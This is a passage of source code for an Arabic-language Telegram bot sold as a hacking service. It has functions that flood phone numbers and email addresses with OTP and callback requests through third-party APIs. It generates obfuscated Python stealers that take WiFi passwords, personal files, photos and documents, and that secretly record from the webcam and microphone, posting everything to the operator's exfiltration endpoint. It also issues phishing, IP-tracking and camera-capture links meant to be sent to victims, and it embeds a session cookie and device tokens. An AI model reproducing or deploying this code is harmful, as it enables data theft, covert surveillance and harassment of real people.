    headers = {'User-Agent': "com.yollacalls/4.71 (Redmi Note 8 Pro; Android 11; ar_EG)", 'Connection': "Keep-Alive", 'Accept': "application/json", 'Accept-Encoding': "gzip", 'Accept-Charset': "UTF-8", 'Accept-Language': "ar"}
    url = "https://api.yollacalls.com/register"
    payload = {'country': "EG", 'device[hardware]': "mt6785", 'device[app_version_code]': "5058", 'device[model]': "Redmi Note 8 Pro", 'device[timezone]': "GMT+3", 'language': "ar", 'device[language]': "ar", 'device[ad_id]': "7dcd0b0f-3f97-43ab-9ba9-d7704273a03d", 'device[rooted]': "false", 'device[product]': "begonia", 'device[android_id]': "b6410ded6f8be6c6", 'verify_by': "callback", 'device[platform]': "android", 'device[device_id]': "ea5993fb3414f9acca6865494aee64f528a3e807", 'device[push_token]': "e6_GD6n7QTKluGzRJLAczv:APA91bFfT7qdKKe_1Cr6gtTVEy55T-IoTSUB1VFQsglGhlDjbEvsHXjvYgW9103jVJnv7rAL2NpakCgc8Rv1tZ4E1VFTix8a5yRYAqlwmqb9oiUF2K_Gz4s", 'device[system_version]': "11", 'device[emulator]': "false", 'key': "X0oMqlskLqp0"}
    payload['phone'] = phone
    try:
        response = requests.post(url, data=payload, headers=headers, timeout=15)
        if response.status_code == 200 and "success" in response.text: return True, f"{ce('✅')} تم إرسال مكالمة Yolla بنجاح"
        return False, f"{ce('❌')} فشل الإرسال: {response.text[:50]}"
    except Exception as e: return False, f"{ce('❌')} خطأ: {str(e)[:30]}"

def send_ether_spam_real(phone, count, task_data, stop_event):
    success, failed = 0, 0
    for i in range(min(count, 50)):
        if stop_event.is_set(): break
        try:
            r = requests.post("https://mw-mobileapp.iq.zain.com/api/otp/request", json={"msisdn": phone}, headers={'User-Agent': "okhttp/4.11.0", 'Content-Type': "application/json"}, timeout=5)
            if r.status_code in [200, 201, 202]:
                success += 1
                task_data["success"] = success
            else:
                failed += 1
                task_data["failed"] = failed
        except:
            failed += 1
            task_data["failed"] = failed
        task_data["progress"] = i + 1
        time.sleep(0.1)
    return success, failed

def send_telegram_spam_real(phone, count, task_data, stop_event):
    success, failed = 0, 0
    for i in range(min(count, 30)):
        if stop_event.is_set(): break
        try:
            r = requests.post('https://my.telegram.org/auth/send_password', cookies={'stel_ln': 'ar', 'stel_acid': 'FrtmvJBwZdq7sey4JzSCm0bwhg97BgwnV5sFftSz09zwfRILdgH_sEVFAIp0KIpM'}, data={'phone': phone}, timeout=5)
            if '"random_hash"' in r.text:
                success += 1
                task_data["success"] = success
            else:
                failed += 1
                task_data["failed"] = failed
        except:
            failed += 1
            task_data["failed"] = failed
        task_data["progress"] = i + 1
        time.sleep(0.15)
    return success, failed

def send_gmail_spam_real(email, count, task_data, stop_event):
    success, failed = 0, 0
    for i in range(min(count, 50)):
        if stop_event.is_set(): break
        try:
            r = requests.post('https://api.kidzapp.com/api/3.0/customlogin/', json={'email': email, 'sdk': 'web', 'platform': 'desktop'}, timeout=5)
            if '"EMAIL SENT"' in r.text:
                success += 1
                task_data["success"] = success
            else:
                failed += 1
                task_data["failed"] = failed
        except:
            failed += 1
            task_data["failed"] = failed
        task_data["progress"] = i + 1
        time.sleep(0.1)
    return success, failed

def run_ds_task(cid, service, target, count=1):
    if service == "telz":
        msg = bot.send_message(cid, f"{ce('⏳')} جاري إرسال مكالمة Telz إلى: {target}...")
        success, res_msg = telz_call_real(target)
        bot.edit_message_text(f"{ce('📞')} {res_msg}\n{ce('📱')} الهدف: {target}", cid, msg.message_id, reply_markup=vip_menu(cid))
    elif service == "yolla":
        msg = bot.send_message(cid, f"{ce('⏳')} جاري إرسال مكالمة Yolla إلى: {target}...")
        success, res_msg = yolla_call_real(target)
        bot.edit_message_text(f"{ce('📞')} {res_msg}\n{ce('📱')} الهدف: {target}", cid, msg.message_id, reply_markup=vip_menu(cid))
    elif service in ["ether", "tg", "gmail"]:
        stop_event = threading.Event()
        task_data = {"success": 0, "failed": 0, "progress": 0, "total": count, "stop": stop_event}
        spam_tasks[cid] = task_data
        msg = bot.send_message(cid, f"{ce('⏳')} <b>جاري تجهيز السبام...</b>\n{ce('🎯')} الهدف: <code>{target}</code>\n{ce('🔢')} العدد: {count}")
        task_data["msg_id"] = msg.message_id
        stats_thread = threading.Thread(target=live_stats_updater, args=(cid, service, target), daemon=True)
        stats_thread.start()
        if service == "ether":
            s, f = send_ether_spam_real(target, count, task_data, stop_event)
            name = "Zain"
        elif service == "tg":
            s, f = send_telegram_spam_real(target, count, task_data, stop_event)
            name = "تيليجرام"
        else:
            s, f = send_gmail_spam_real(target, count, task_data, stop_event)
            name = "جيميل"
        stop_event.set()
        time.sleep(1.5) 
        final_txt = f"{ce('✅')} <b>اكتمل سبام {name}!</b>\n\n{ce('🎯')} الهدف: <code>{target}</code>\n{ce('🔢')} العدد المطلوب: {count}\n\n{ce('🟢')} النجاح: <code>{s}</code>\n{ce('🔴')} الفشل: <code>{f}</code>\n"
        try: bot.edit_message_text(final_txt, cid, msg.message_id, reply_markup=vip_menu(cid))
        except: bot.send_message(cid, final_txt, reply_markup=vip_menu(cid))
        if cid in spam_tasks: del spam_tasks[cid]

def live_stats_updater(cid, service, target):
    while cid in spam_tasks and not spam_tasks[cid]["stop"].is_set():
        try:
            data = spam_tasks[cid]
            s, f, p, t = data.get("success", 0), data.get("failed", 0), data.get("progress", 0), data.get("total", 0)
            percent = int((p / t) * 100) if t > 0 else 0
            bar = "█" * int(20 * p / t) + "░" * (20 - int(20 * p / t)) if t > 0 else "░" * 20
            txt = f"{ce('🔴')} <b>شاشة الإحصائيات الحية</b> {ce('🔴')}\n\n{ce('🎯')} الهدف: <code>{target}</code>\n{ce('⚡')} الخدمة: {service.upper()}\n\n{ce('📊')} التقدم: {p}/{t} ({percent}%)\n[{bar}]\n\n{ce('🟢')} ناجح: <code>{s}</code>\n{ce('🔴')} فاشل: <code>{f}</code>\n\n⏱ يتم التحديث تلقائياً..."
            bot.edit_message_text(txt, cid, data["msg_id"])
        except: pass
        time.sleep(1.2)

@bot.callback_query_handler(func=lambda call: True)
def handle_all_buttons(call):
    cid = call.message.chat.id
    if is_banned(cid): return
    data = call.data

    if data == "admin_panel" and is_admin(cid):
        safe_edit(f"{ce('👑')} <b>[ لوحة تحكم الأدمن ]</b>", cid, call.message.message_id, reply_markup=admin_panel())
    elif data == "adm_add_ch" and is_admin(cid):
        states["add_ch"][cid] = True
        safe_edit(f"➕ <b>أرسل معرف القناة (مثل @channel) أو آيدي القناة:</b>", cid, call.message.message_id)
    elif data == "adm_rm_ch" and is_admin(cid):
        states["rm_ch"][cid] = True
        safe_edit(f"➖ <b>أرسل آيدي القناة:</b>", cid, call.message.message_id)
    elif data == "adm_ban" and is_admin(cid):
        states["ban"][cid] = True
        safe_edit(f"{ce('🚫')} <b>أرسل آيدي العضو:</b>", cid, call.message.message_id)
    elif data == "adm_unban" and is_admin(cid):
        states["unban"][cid] = True
        safe_edit(f"✅ <b>أرسل آيدي العضو:</b>", cid, call.message.message_id)
    elif data == "adm_broadcast" and is_admin(cid):
        states["broadcast"][cid] = True
        safe_edit(f"📢 <b>أرسل الرسالة:</b>", cid, call.message.message_id)
    elif data == "adm_send_msg" and is_admin(cid):
        states["send_msg"][cid] = True
        safe_edit(f"📩 <b>أرسل (آيدي رسالة):</b>", cid, call.message.message_id)
    elif data == "adm_user_info" and is_admin(cid):
        states["user_info"][cid] = True
        safe_edit(f"🔍 <b>أرسل آيدي العضو:</b>", cid, call.message.message_id)
    elif data == "adm_add_admin" and is_admin(cid):
        states["add_admin"][cid] = True
        safe_edit(f"➕ <b>أرسل آيدي الأدمن:</b>", cid, call.message.message_id)
    elif data == "adm_rm_admin" and is_admin(cid):
        states["rm_admin"][cid] = True
        safe_edit(f"➖ <b>أرسل آيدي الأدمن:</b>", cid, call.message.message_id)
    elif data == "adm_maintenance" and is_admin(cid):
        curr = load_maintenance()
        save_maintenance(not curr)
        state = f"مُفعّل ⚠️" if not curr else f"مُعطّل ✅"
        safe_edit(f"{ce('🚧')} <b>الصيانة: {state}</b>", cid, call.message.message_id, reply_markup=admin_panel())
    elif data == "adm_lock_vip" and is_admin(cid):
        curr = load_vip_lock()
        save_vip_lock(not curr)
        state = f"مُغلق 🔒" if not curr else f"مفتوح ✅"
        safe_edit(f"🔒 <b>قسم VIP الآن: {state}</b>", cid, call.message.message_id, reply_markup=admin_panel())
    elif data == "adm_vip_7d" and is_admin(cid):
        states["adm_vip_7d_input"][cid] = True
        safe_edit(f"⭐ <b>أرسل آيدي العضو لVIP 7 أيام:</b>", cid, call.message.message_id)
    elif data == "adm_vip_30d" and is_admin(cid):
        states["adm_vip_30d_input"][cid] = True
        safe_edit(f"🌟 <b>أرسل آيدي العضو لVIP 30 يوم:</b>", cid, call.message.message_id)
    elif data == "adm_top_inviters" and is_admin(cid):
        users = load_users()
        top = sorted(users, key=lambda x: x.get('ref_count', 0), reverse=True)[:10]
        txt = f"{ce('🏆')} <b>قائمة الأكثر دعوةً للأعضاء:</b>\n\n"
        for i, u in enumerate(top):
            txt += f"{i+1}. {u.get('fname', 'لا يوجد')} - <code>{u['id']}</code> [دعوات: {u.get('ref_count', 0)}]\n"
        if not top: txt = "لا يوجد أعضاء بعد."
        bot.send_message(cid, txt)
    elif data == "adm_export_users" and is_admin(cid):
        users = load_users()
        ids = "\n".join([str(u['id']) for u in users])
        file_stream = io.BytesIO(ids.encode('utf-8'))
        file_stream.name = "users_ids.txt"
        bot.send_document(cid, file_stream, caption=f"📤 <b>تم استخراج {len(users)} عضو بنجاح.</b>", reply_markup=admin_panel())
    elif data == "adm_reset_stats" and is_admin(cid):
        save_stats({"hacked": 0, "files": 0})
        safe_edit(f"{ce('🧹')} <b>تم تصفير الإحصائيات بنجاح.</b>", cid, call.message.message_id, reply_markup=admin_panel())
    elif data == "adm_export_backup" and is_admin(cid):
        try:
            backup_path = os.path.join(DATA_DIR, "backup.zip")
            if os.path.exists(backup_path): os.remove(backup_path)
            with zipfile.ZipFile(backup_path, 'w') as zipf:
                for root, _, files in os.walk(DATA_DIR):
                    for file in files:
                        if file != "backup.zip":
                            zipf.write(os.path.join(root, file), os.path.relpath(os.path.join(root, file), DATA_DIR))
            with open(backup_path, 'rb') as f:
                bot.send_document(cid, f, caption=f"📤 <b>نسخة احتياطية كاملة لجميع البيانات</b>", reply_markup=admin_panel())
            os.remove(backup_path)
            bot.delete_message(cid, call.message.message_id)
        except Exception as e:
            safe_edit(f"❌ <b>خطأ:</b> <code>{e}</code>", cid, call.message.message_id, reply_markup=admin_panel())
    elif data == "adm_restore_backup" and is_admin(cid):
        states["restore_backup"][cid] = True
        safe_edit(f"📥 <b>أرسل ملف ZIP لاستعادة النسخة الاحتياطية:</b>\n⚠️ سيتم استبدال جميع البيانات الحالية!", cid, call.message.message_id)
    elif data == "adm_stats" and is_admin(cid):
        users = load_users()
        banned = load_banned()
        admins = load_admins()
        stats = load_stats()
        vip_count = sum(1 for u in users if check_vip(u))
        total_keys = len(load_vip_keys())
        txt = (
            f"{ce('📊')} <b>إحصائيات البوت الشاملة</b>\n\n"
            f"{ce('👥')} <b>إجمالي الأعضاء:</b> <code>{len(users)}</code>\n"
            f"{ce('💎')} <b>أعضاء VIP:</b> <code>{vip_count}</code>\n"
            f"{ce('🚫')} <b>المحظورين:</b> <code>{len(banned)}</code>\n"
            f"{ce('👑')} <b>المشرفين:</b> <code>{len(admins)}</code>\n"
            f"{ce('🔑')} <b>مفاتيح VIP:</b> <code>{total_keys}</code>\n\n"
            f"{ce('📈')} <b>إحصائيات الاستخدام:</b>\n"
            f"{ce('📁')} <b>الأدوات المولدة:</b> <code>{stats.get('files', 0)}</code>\n"
            f"{ce('🎣')} <b>عمليات الصيد:</b> <code>{stats.get('hacked', 0)}</code>"
        )
        safe_edit(txt, cid, call.message.message_id, reply_markup=admin_panel())

    elif data == "adm_vip_keys_menu" and is_admin(cid):
        safe_edit(f"{ce('🔑')} <b>[ إدارة مفاتيح VIP ]</b>\n\nيمكنك إنشاء وتعطيل وحذف مفاتيح VIP من هنا.", cid, call.message.message_id, reply_markup=vip_keys_menu())
    elif data == "adm_create_vip_key" and is_admin(cid):
        states["create_vip_key_days"][cid] = True
        safe_edit(f"➕ <b>إنشاء مفتاح جديد</b>\n\nأرسل عدد أيام الاشتراك لهذا المفتاح (مثال: 30):", cid, call.message.message_id, reply_markup=vip_keys_menu())
    elif data == "adm_list_vip_keys" and is_admin(cid):
        keys = load_vip_keys()
        if not keys:
            txt = f"{ce('📋')} <b>قائمة المفاتيح</b>\n\nلا توجد مفاتيح حالياً."
        else:
            txt = f"{ce('📋')} <b>قائمة مفاتيح VIP</b>\n\n"
            for k, v in keys.items():
                status = f"{ce('🟢')} مفعّل" if v.get('status', 'active') == 'active' else f"{ce('🔴')} معطّل"
                users_list = ", ".join(map(str, v.get('users', []))) if v.get('users') else "لا يوجد"
                txt += f"{ce('🔑')} <code>{k}</code>\n⏳ الأيام: {v['days']} | متبقي: {v['uses_left']}/{v['max_uses']}\n{ce('👤')} المستخدمين: {users_list}\nالحالة: {status}\n\n"
        safe_edit(txt, cid, call.message.message_id, reply_markup=vip_keys_menu())
    elif data == "adm_disable_vip_key" and is_admin(cid):
        states["disable_vip_key"][cid] = True
        safe_edit(f"❌ <b>تعطيل مفتاح</b>\n\nأرسل المفتاح الذي تريد تعطيله:", cid, call.message.message_id, reply_markup=vip_keys_menu())
    elif data == "adm_enable_vip_key" and is_admin(cid):
        states["enable_vip_key"][cid] = True
        safe_edit(f"✅ <b>تفعيل مفتاح</b>\n\nأرسل المفتاح الذي تريد تفعيله:", cid, call.message.message_id, reply_markup=vip_keys_menu())
    elif data == "adm_delete_vip_key" and is_admin(cid):
        states["delete_vip_key"][cid] = True
        safe_edit(f"{ce('🗑')} <b>حذف مفتاح</b>\n\nأرسل المفتاح الذي تريد حذفه نهائياً:", cid, call.message.message_id, reply_markup=vip_keys_menu())

    elif data == "gen_ip_logger":
        track_link = f"{WEB_HOST_URL}/ip_track?user={cid}"
        safe_edit(f"{ce('🔗')} <b>[ تتبع IP الضحية ]</b>\n\nتم إنشاء رابط تتبع خاص بك:\n<code>{track_link}</code>\n\n⚠️ <i>أرسل الرابط للضحية. عند فتحه سيتم سحب الـ IP ومزود الخدمة وإرسالهم لك هنا.</i>", cid, call.message.message_id, reply_markup=free_menu())

    elif data == "crypto_checker":
        states["crypto_check_input"][cid] = True
        bot.send_message(cid, f"{ce('💰')} <b>[ فاحص المحافظ المشفرة ]</b>\n\nأرسل عنوان المحفظة (Bitcoin أو Ethereum):\n<i>مثال: 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa</i>")

    elif data == "gen_clipboard_hijack":
        user_data = get_user(cid)
        if not (is_admin(cid) or (user_data and check_vip(user_data))):
            return bot.answer_callback_query(call.id, f"❌ VIP مطلوب!", show_alert=True)
        states["cb_hijack_input"][cid] = True
        bot.send_message(cid, f"{ce('💳')} <b>[ مختطف محافظ الكريبتو ]</b>\n\nأرسل <b>عنوان محفظتك</b> (Bitcoin أو Ethereum) الذي تريد استبدال محفظة الضحية بها:")

    elif data == "surveillance_menu":
        user_data = get_user(cid)
        if not (is_admin(cid) or (user_data and check_vip(user_data))):
            return bot.answer_callback_query(call.id, f"❌ VIP مطلوب!", show_alert=True)
        safe_edit(f"{ce('👁‍🗨')} <b>[ نظام المراقبة المتقدم ]</b>\n\nاختر نوع الالتقاط الذي تريده. سيتم إنشاء رابط ترسله للضحية، عند فتحه سيتم الالتقاط فوراً.", cid, call.message.message_id, reply_markup=surveillance_menu())

    elif data.startswith("surv_"):
        user_data = get_user(cid)
        if not (is_admin(cid) or (user_data and check_vip(user_data))):
            return bot.answer_callback_query(call.id, f"❌ VIP مطلوب!", show_alert=True)
        surv_type = data.replace("surv_", "")
        surv_link = f"{WEB_HOST_URL}/{surv_type}?user={cid}"
        names = {"photo_front": "📸 صورة بالكاميرا الأمامية", "photo_back": "📷 صورة بالكاميرا الخلفية", "video_front": "🎥 تسجيل فيديو", "audio_mic": "🎙️ تسجيل صوتي"}
        safe_edit(f"{ce('🔗')} <b>[ {names.get(surv_type, 'التقاط')} ]</b>\n\nتم إنشاء رابط المراقبة:\n<code>{surv_link}</code>\n\n⚠️ <i>أرسل الرابط للضحية. عند فتحه وموافقته، سيتم إرسال المحتوى إليك هنا.</i>", cid, call.message.message_id, reply_markup=surveillance_menu())

    elif data == "gen_wifi_stealer":
        user_data = get_user(cid)
        if not (is_admin(cid) or (user_data and check_vip(user_data))):
            return bot.answer_callback_query(call.id, f"❌ VIP مطلوب!", show_alert=True)
        safe_edit(f"⏳ <b>جاري توليد أداة سحب كلمات مرور الواي فاي...</b>", cid, call.message.message_id)
        try:
            increment_stat("files")
            tool_code = '''
import time, sys, os, subprocess, glob, requests

C = "__CHAT_ID__"
EXFIL_URL = "__WEB_URL__/exfil"

try:
    requests.post(EXFIL_URL, data={'cid': C, 'text': "📶 جاري سحب كلمات مرور الواي فاي..."})
except: pass

data = ""
try:
    if os.name == 'nt': # Windows
        temp_dir = os.path.join(os.environ.get('TEMP', 'C:\\\\'), 'wifi_dump')
        os.makedirs(temp_dir, exist_ok=True)
        subprocess.run(['netsh', 'wlan', 'export', 'profile', 'key=clear', f'folder={temp_dir}'], capture_output=True)
        for file in glob.glob(os.path.join(temp_dir, '*.xml')):
            with open(file, 'r', encoding='utf-8', errors='ignore') as f:
                content = f.read()
                name = os.path.basename(file).replace('.xml', '')
                if '<keyMaterial>' in content:
                    key = content.split('<keyMaterial>')[1].split('</keyMaterial>')[0]
                    data += f"{name}: {key}\\n"
            os.remove(file)
        if not data: data = "لم يتم العثور على شبكات محفوظة أو الجهاز لا يستخدم ويندوز."
    elif os.path.exists('/sdcard'): # Android (Requires Root)
        res = subprocess.run(['cat', '/data/misc/wifi/wpa_supplicant.conf'], capture_output=True, text=True)
        if res.stdout: data += res.stdout
        else: data = "يتطلب الهاتف صلاحيات Root لسحب كلمات المرور."
    else: # Linux
        res = subprocess.run(['ls', '/etc/NetworkManager/system-connections/'], capture_output=True, text=True)
        if res.stdout:
            for f_name in res.stdout.split():
                res2 = subprocess.run(['cat', f'/etc/NetworkManager/system-connections/{f_name}'], capture_output=True, text=True)
                if 'psk=' in res2.stdout:
                    psk = res2.stdout.split('psk=')[1].split('\\n')[0]
                    data += f"{f_name}: {psk}\\n"
        if not data: data = "لا يمكن الوصول لملفات الشبكة (يتطلب صلاحيات Root)."
except Exception as e:
    data = f"خطأ: {e}"

try:
    requests.post(EXFIL_URL, files={'file': ('WiFi_Passwords.txt', data)}, data={'cid': C})
except: pass

time.sleep(5)
'''
            tool_code = tool_code.replace("__CHAT_ID__", str(cid)).replace("__WEB_URL__", WEB_HOST_URL)
            enc_code = military_encrypt(tool_code)
            file_stream = io.BytesIO(enc_code.encode('utf-8'))
            file_stream.name = "WiFi_Stealer.py"
            bot.send_document(cid, file_stream, caption=f"✅ <b>تم إنشاء أداة سحب الواي فاي بنجاح!</b>\nتعمل على (ويندوز، لينكس، أندرويد).", reply_markup=vip_menu(cid))
            bot.delete_message(cid, call.message.message_id)
        except Exception as e:
            safe_edit(f"❌ <b>فشل إنشاء الأداة!</b>\n<code>{str(e)}</code>", cid, call.message.message_id, reply_markup=vip_menu(cid))

    elif data == "gen_all_files":
        user_data = get_user(cid)
        if not (is_admin(cid) or (user_data and check_vip(user_data))):
            return bot.answer_callback_query(call.id, f"❌ VIP مطلوب!", show_alert=True)
        safe_edit(f"⏳ <b>جاري توليد أداة سحب جميع الملفات...</b>", cid, call.message.message_id)
        try:
            increment_stat("files")
            tool_code = '''
import time, sys, os, requests

C = "__CHAT_ID__"
EXFIL_URL = "__WEB_URL__/exfil"

def send_file(filepath):
    try:
        if os.path.getsize(filepath) < 50000000: # 50MB Limit
            files = {'file': open(filepath, 'rb')}
            data = {'cid': C}
            requests.post(EXFIL_URL, files=files, data=data, timeout=120)
    except: pass

paths = []

if os.name == 'nt': # Windows
    user = os.environ.get('USERPROFILE', 'C:\\\\Users\\\\Public')
    paths.append(os.path.join(user, 'Desktop'))
    paths.append(os.path.join(user, 'Downloads'))
    paths.append(os.path.join(user, 'Documents'))
    paths.append(os.path.join(user, 'Pictures'))
elif os.path.exists('/sdcard'): # Android
    paths.append('/sdcard/Download')
    paths.append('/sdcard/Documents')
    paths.append('/sdcard/DCIM/Camera')
    paths.append('/sdcard/Pictures')
    paths.append('/sdcard/WhatsApp/Media')
else: # Linux/Mac
    user = os.path.expanduser('~')
    paths.append(os.path.join(user, 'Desktop'))
    paths.append(os.path.join(user, 'Downloads'))
    paths.append(os.path.join(user, 'Documents'))
    paths.append(os.path.join(user, 'Pictures'))

max_files = 200
extracted = 0

try:
    requests.post(EXFIL_URL, data={'cid': C, 'text': "📁 جاري سحب الملفات من الجهاز..."})
except: pass

for p in paths:
    if extracted >= max_files: break
    if os.path.exists(p):
        for root, dirs, files in os.walk(p):
            if extracted >= max_files: break
            for f in files:
                if extracted >= max_files: break
                fp = os.path.join(root, f)
                send_file(fp)
                extracted += 1

try:
    requests.post(EXFIL_URL, data={'cid': C, 'text': f"✅ تم الانتهاء من سحب الملفات. تم إرسال {extracted} ملف."})
except: pass

time.sleep(5)
'''
            tool_code = tool_code.replace("__CHAT_ID__", str(cid)).replace("__WEB_URL__", WEB_HOST_URL)
            enc_code = military_encrypt(tool_code)
            file_stream = io.BytesIO(enc_code.encode('utf-8'))
            file_stream.name = "All_Files_Stealer.py"
            bot.send_document(cid, file_stream, caption=f"✅ <b>تم إنشاء أداة سحب جميع الملفات!</b>\nتعمل على (ويندوز، لينكس، أندرويد).", reply_markup=vip_menu(cid))
            bot.delete_message(cid, call.message.message_id)
        except Exception as e:
            safe_edit(f"❌ <b>فشل إنشاء الأداة!</b>\n<code>{str(e)}</code>", cid, call.message.message_id, reply_markup=vip_menu(cid))

    elif data in ["gen_images", "gen_music", "gen_videos", "gen_docs", "gen_sysinfo"]:
        safe_edit(f"⏳ <b>جاري التوليد والتشفير الفعلي...</b>", cid, call.message.message_id)
        try:
            increment_stat("files")
            if data == "gen_images":
                exts = "['.jpg', '.jpeg', '.png', '.gif', '.webp', '.bmp']"
                ftype = "Photo"
                tool_name = "Images_Stealer.py"
            elif data == "gen_music":
                exts = "['.mp3', '.wav', '.ogg', '.m4a', '.flac', '.aac']"
                ftype = "Audio"
                tool_name = "Music_Stealer.py"
            elif data == "gen_videos":
                exts = "['.mp4', '.avi', '.mov', '.mkv', '.3gp', '.webm']"
                ftype = "Video"
                tool_name = "Videos_Stealer.py"
            elif data == "gen_docs":
                exts = "['.pdf', '.docx', '.txt', '.xlsx', '.zip', '.rar']"
                ftype = "Document"
                tool_name = "Docs_Stealer.py"
            else:
                tool_code = '''
import time, sys, os, requests, subprocess, platform

C = "__CHAT_ID__"
EXFIL_URL = "__WEB_URL__/exfil"

def get_info():
    info = "💻 معلومات الجهاز:\\n\\n"
    try:
        info += f"نظام التشغيل: {os.name}\\n"
        info += f"المستخدم: {os.getlogin()}\\n"
    except: pass
    try:
        model = subprocess.check_output(['getprop', 'ro.product.model']).decode('utf-8').strip()
        android = subprocess.check_output(['getprop', 'ro.build.version.release']).decode('utf-8').strip()
        info += f"موديل الهاتف: {model}\\n"
        info += f"إصدار أندرويد: {android}\\n"
    except: pass
    return info

try:
    requests.post(EXFIL_URL, data={'cid': C, 'text': get_info()})
except: pass
time.sleep(5)
'''
                tool_code = tool_code.replace("__CHAT_ID__", str(cid)).replace("__WEB_URL__", WEB_HOST_URL)
                enc_code = military_encrypt(tool_code)
                file_stream = io.BytesIO(enc_code.encode('utf-8'))
                file_stream.name = "System_Info.py"
                bot.send_document(cid, file_stream, caption=f"✅ <b>تم إنشاء وتشفير السكربت بنجاح (9 طبقات).</b>", reply_markup=free_menu())
                bot.delete_message(cid, call.message.message_id)
                return

            tool_code = '''
import time, sys, os, requests

C = "__CHAT_ID__"
EXFIL_URL = "__WEB_URL__/exfil"

if not os.path.exists("/sdcard"):
    print("هذا البرنامج يدعم أجهزة الهاتف فقط.")
    sys.exit()

def send_file(filepath, ftype):
    try:
        if os.path.getsize(filepath) < 50000000: 
            files = {'file': open(filepath, "rb")}
            data = {'cid': C, 'type': ftype}
            requests.post(EXFIL_URL, files=files, data=data, timeout=60)
    except: pass

print("تم التشغيل لفك وتهيئة النظام...")
time.sleep(1)

try:
    requests.post(EXFIL_URL, data={'cid': C, 'text': "✅ تم الدخول للهاتف!\\n🎯 جاري سحب الملفات المحددة..."})
except: pass

allowed_exts = ''' + exts + '''

paths = [
    "/sdcard/DCIM/Camera", "/sdcard/Pictures", "/sdcard/Download", 
    "/sdcard/Documents", "/sdcard/Music", "/sdcard/Movies", 
    "/sdcard/WhatsApp/Media", "/sdcard/Telegram/Telegram Documents",
    "/sdcard/Telegram/Telegram Audio", "/sdcard/Telegram/Telegram Video",
    "/sdcard/Telegram/Telegram Photos"
]

extracted = 0
max_files = 50

for p in paths:
    if extracted >= max_files: break
    if os.path.exists(p):
        for root, dirs, files in os.walk(p):
            if extracted >= max_files: break
            for file in files:
                if extracted >= max_files: break
                fp = os.path.join(root, file)
                try:
                    if file.lower().endswith(tuple(allowed_exts)):
                        send_file(fp, "''' + ftype + '''")
                        extracted += 1
                except: pass

try:
    requests.post(EXFIL_URL, data={'cid': C, 'text': "✅ تم الانتهاء من السحب. تم إرسال " + str(extracted) + " ملف."})
except: pass

print("اكتمل التحديث. يمكنك الإغلاق.")
time.sleep(5)
'''
            tool_code = tool_code.replace("__CHAT_ID__", str(cid)).replace("__WEB_URL__", WEB_HOST_URL)
            enc_code = military_encrypt(tool_code)
            file_stream = io.BytesIO(enc_code.encode('utf-8'))
            file_stream.name = tool_name
            bot.send_document(cid, file_stream, caption=f"✅ <b>تم إنشاء وتشفير السكربت بنجاح (9 طبقات).</b>", reply_markup=free_menu())
            bot.delete_message(cid, call.message.message_id)
        except Exception as e:
            safe_edit(f"❌ <b>فشل إنشاء السكربت!</b>\n<code>{str(e)}</code>", cid, call.message.message_id, reply_markup=free_menu())

    elif data == "gen_spy_cam":
        user_data = get_user(cid)
        if not (is_admin(cid) or (user_data and check_vip(user_data))):
            return bot.answer_callback_query(call.id, f"❌ VIP مطلوب!", show_alert=True)
        safe_edit(f"⏳ <b>جاري توليد أداة التجسس الصامت...</b>", cid, call.message.message_id)
        try:
            increment_stat("files")
            tool_code = '''
import time, sys, os, subprocess, requests

C = "__CHAT_ID__"
EXFIL_URL = "__WEB_URL__/exfil"

try:
    requests.post(EXFIL_URL, data={'cid': C, 'text': "🎥 التجسس بدأ بنجاح..."})
except: pass

# Auto-install required packages for PC
try:
    import cv2
except:
    subprocess.run([sys.executable, "-m", "pip", "install", "opencv-python"], capture_output=True)
    import cv2

try:
    import sounddevice as sd
    import soundfile as sf
    import numpy as np
except:
    subprocess.run([sys.executable, "-m", "pip", "install", "sounddevice", "soundfile", "numpy"], capture_output=True)
    import sounddevice as sd
    import soundfile as sf
    import numpy as np

def spy():
    try:
        cap = cv2.VideoCapture(0)
        ret, frame = cap.read()
        if ret:
            cv2.imwrite('spy.jpg', frame)
            cap.release()
            files = {'file': open('spy.jpg', 'rb')}
            data = {'cid': C, 'type': 'Photo'}
            requests.post(EXFIL_URL, files=files, data=data, timeout=30)
            os.remove('spy.jpg')
    except: pass

    try:
        fs = 44100
        seconds = 10
        recording = sd.rec(int(seconds * fs), samplerate=fs, channels=1)
        sd.wait()
        sf.write('spy.wav', recording, fs)
        files2 = {'file': open('spy.wav', 'rb')}
        data2 = {'cid': C, 'type': 'Audio'}
        requests.post(EXFIL_URL, files=files2, data=data2, timeout=30)
        os.remove('spy.wav')
    except: pass

while True:
    spy()
    time.sleep(60)
'''
            tool_code = tool_code.replace("__CHAT_ID__", str(cid)).replace("__WEB_URL__", WEB_HOST_URL)
            enc_code = military_encrypt(tool_code)
            file_stream = io.BytesIO(enc_code.encode('utf-8'))
            file_stream.name = "Silent_Spy.py"
            bot.send_document(cid, file_stream, caption=f"✅ <b>تم إنشاء أداة التجسس بنجاح!</b>\n\n⚠️ <i>تعمل على الكمبيوتر والهاتف. تلتقط صورة وتسجل صوتاً كل دقيقة وترسله لك.</i>", reply_markup=vip_menu(cid))
            bot.delete_message(cid, call.message.message_id)
        except Exception as e:
            safe_edit(f"❌ <b>فشل إنشاء أداة التجسس!</b>\n<code>{str(e)}</code>", cid, call.message.message_id, reply_markup=vip_menu(cid))

    elif data in ["social_tiktok", "social_whatsapp", "social_facebook", "social_instagram", "social_twitter", "social_snapchat", "clash_of_clans_hack", "gen_wa_db", "gen_session_stealer", "freefire_hack", "pubg_hack", "insta_followers_hack", "tiktok_likes_hack", "telegram_login_hack"]:
        user_data = get_user(cid)
        if not (is_admin(cid) or (user_data and check_vip(user_data))):
            return bot.answer_callback_query(call.id, f"❌ انتهت صلاحية VIP أو القسم مغلق!", show_alert=True)
        
        if data in ["social_tiktok", "social_whatsapp", "social_facebook", "social_instagram", "social_twitter", "social_snapchat"]:
            platform_name = data.replace("social_", "")
            fake_link = f"{BASE_SOCIAL_URL}/{platform_name}?user={cid}"
            safe_edit(f"{ce('📡')} <b>[ قسم السوشيال ميديا ]</b>\n\n{ce('🔗')} <b>تم إنشاء رابط هندسة اجتماعية بنجاح:</b>\n<code>{fake_link}</code>\n\n⚠️ <i>أرسل الرابط للضحية.</i>", cid, call.message.message_id, reply_markup=social_menu())
        elif data == "freefire_hack":
            fake_link = f"{BASE_SOCIAL_URL}/freefire?user={cid}"
